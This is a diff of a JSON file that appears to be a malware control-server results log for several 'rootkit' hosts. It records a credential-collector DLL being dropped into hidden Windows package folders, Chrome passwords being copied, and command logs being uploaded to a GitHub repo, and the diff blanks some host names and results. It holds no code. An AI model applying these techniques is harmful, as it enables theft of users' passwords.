@@ -1,30 +1,30 @@
 {
 "rootkit_path1":{
-	"name":"greta_preprod",
+	"name":"",
 	"results":{
-		"result1":"The file target_command.txt exists, trying to upload it content.The files C:\\Users\\sophie\\SendTo\\target_command.log has been uploaded successfully in the github repo",
+		"result1":"",
 		"result2":"Success to write the content (number of bytes: 343040) in the file : C:\\Users\\sophie\\SendTo\\CredentialsCollectorDll.dll\nThe file is not created on the random folder\nSuccess to execute the method collectAllCredentialsFunc in the credentials dll.\nThe file that contains chrome passwords has been copied.\nThe file that contains passwords has been created.\nThe file that contains passwords has been created.\n",
 		"result3":"The file target_command.txt exists, trying to upload it content.Fail to read the file."}},
 "rootkit_path2":{
-	"name":"Preprod04",
+	"name":"",
 	"results":{
 		"result1":"Command not understood",
 		"result2":"Unable to find the file command.txt. Check your command..",
 		"result3":""}},
 "rootkit_path3":{
-	"name":"dev",
+	"name":"",
 	"results":{
 		"result1":"Success to write the content (number of bytes: 343040) in the file : C:\\Users\\sophie\\AppData\\Local\\Packages\\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\\AC\\INetCache\\CredentialsCollectorDll.dll\nThe file is not created on the random folder\nSuccess to execute the method collectAllCredentialsFunc in the credentials dll.\nThe file that contains chrome passwords has been copied.\nThe file that contains passwords has been created.\nThe file that contains passwords has been created.\n",
 		"result2":" ",
 		"result3":""}},
 "rootkit_path4":{
-	"name":"Preprod04",
+	"name":"",
 	"results":{
 		"result1":"",
 		"result2":"",
 		"result3":""}},
 "rootkit_path5":{
-	"name":"CorepPreprod",
+	"name":"",
 	"results":{
 		"result1":"The file target_command.txt exists, trying to upload it content.The files C:\\Users\\sophie\\AppData\\Local\\Packages\\windows.immersivecontrolpanel_cw5n1h2txyewy\\LocalState\\target_command.log has been uploaded successfully in the github repo",
 		"result2":"Success to write the content (number of bytes: 343040) in the file : C:\\Users\\sophie\\AppData\\Local\\Packages\\windows.immersivecontrolpanel_cw5n1h2txyewy\\LocalState\\CredentialsCollectorDll.dll\nThe file is not created on the random folder\nSuccess to execute the method collectAllCredentialsFunc in the credentials dll.\nThe file that contains chrome passwords has been copied.\nThe file that contains passwords has been created.\nThe file that contains passwords has been created.\n",
